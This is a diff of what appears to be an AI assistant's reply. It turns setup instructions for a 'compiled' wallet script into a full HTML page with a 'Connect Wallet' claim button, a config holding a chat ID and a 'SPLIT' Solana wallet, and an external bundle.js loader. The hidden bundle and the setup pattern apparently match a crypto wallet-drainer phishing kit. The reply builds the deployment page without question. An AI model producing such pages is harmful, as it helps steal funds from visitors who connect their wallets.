@@ -1,20 +1,50 @@
-✅ Compilation Successful
+Here’s a clean .html page with your button and the script included exactly as requested:
 
-📌 How to install:
-Add these scripts before closing </body> tag:
-
-<script>
-window.__APP_CONFIG__ = {
-  CHAT_ID: "7902687335"
-  SPLIT: "YourSolanaWalletHere",
-};
-</script>
-<script defer="defer" src="bundle.js"></script>
-
-
-⚡ To trigger the wallet modal, add the class connect-button to any button of your choice:
-
-<button class="connect-button">Connect Wallet</button>
-
-
-📂 Upload both JS files to the same folder on your site.
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Connect Wallet</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: #0f0f0f;
+      font-family: Arial, sans-serif;
+    }
+    .claim-button {
+      padding: 14px 28px;
+      background: #7c3aed;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: 0.2s ease;
+    }
+    .claim-button:hover {
+      background: #6d28d9;
+      transform: scale(1.03);
+    }
+  </style>
+</head>
+<body>
+  <!-- Button -->
+  <button class="claim-button connect-button">
+    Connect Wallet
+  </button>
+  <!-- Config Script -->
+  <script>
+  window.__APP_CONFIG__ = {
+    CHAT_ID: "7902687335",
+    SPLIT: "YourSolanawallet",
+  };
+  </script>
+  <!-- Bundle -->
+  <script defer="defer" src="bundle.js"></script>
+</body>
+</html>
